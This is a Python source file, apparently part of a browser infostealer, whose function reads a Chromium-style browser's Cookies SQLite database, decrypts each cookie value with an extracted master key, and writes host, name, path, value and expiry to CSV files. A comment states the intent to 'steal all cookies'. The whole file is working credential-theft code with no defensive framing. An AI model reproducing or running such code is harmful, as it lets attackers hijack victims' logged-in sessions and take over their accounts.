from asyncio import log
import os
import sqlite3
import csv

# -------------------------------------------------------
# import decrypt function
from modules.Browsers.decrypt import decrypt_password
from modules.Browsers._data_breeding_ import Cookies
# -------------------------------------------------------

import log_Style

# steal all cookies and stoke in file csv 
def get_cookies(profilePath, masterKey: bytes, cookiesFile: str, browser_name: str) -> None:
    cookies_db: str = f'{profilePath}\\Network\\Cookies' # cookies poth in browser
    if not os.path.exists(cookies_db):# check file not exists return None
        return None
    

    try:
        
        with sqlite3.connect(cookies_db) as conn: # connect to sqlite file Cookies
            cursor: object = conn.cursor() # create cursor object
            cursor.execute(
                'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies'
                )# Select teables  from cookies file
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
                    continue
                    
                cookie: bytes = decrypt_password(row[3], masterKey) # decrypt cookies value
                h = Cookies(row[0], row[1], row[2], cookie, row[4])
                log_Style.ALL_COOKIES += 1
                with open(f'{cookiesFile}\\Cookies.csv', "a", encoding='utf-8', newline="") as cookiesFiles:
                    write_csv = csv.writer(cookiesFiles)
                    write_csv.writerow(h.to_list_())

                cookies_folder:  str = os.path.join(cookiesFile, "Browser Cookies")
                os.makedirs(cookies_folder, exist_ok=True) 
                with open(f'{cookies_folder}\\{browser_name} Cookies.csv', "a", encoding="utf-8", newline="") as cookies_browser_file:
                    cookies_write_file: object = csv.writer(cookies_browser_file)
                    cookies_write_file.writerow(h.to_list_())
    except Exception as e:
        print(e)

